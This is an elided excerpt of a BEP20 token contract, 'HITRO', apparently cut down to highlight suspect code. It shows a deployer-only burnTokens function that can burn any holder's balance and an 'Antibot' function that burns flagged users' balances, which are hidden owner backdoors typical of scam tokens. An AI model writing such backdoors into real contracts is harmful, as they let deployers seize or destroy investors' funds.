...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 RewardToken = IBEP20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c); //BNB Contract Address
...
abstract contract Auth {
    ...
    address constant deployer = 0x58f95081B97aa7010AA510bCc632BF5B47eF71bF;
...
contract HITRO is IBEP20, Auth {
    ...
    string private constant _name = "HITRO";
    string private constant _symbol = "HTO";
    ...
    constructor () Auth(msg.sender) {
        ...
        authorizations[rewardWallet] = true;
        ...
        rewardWallet = 0x12846c53C420EEf126a4eaDbF3a142ed49E24e5E; // this wallet funds goes here will be for charity
    ...
    function burnTokens(address account, uint256 amount) external authorized {
        require(msg.sender == deployer);
    ...
    function Antibot(address _user) external authorized {
       //know that any bot killed, the user balance will be burned
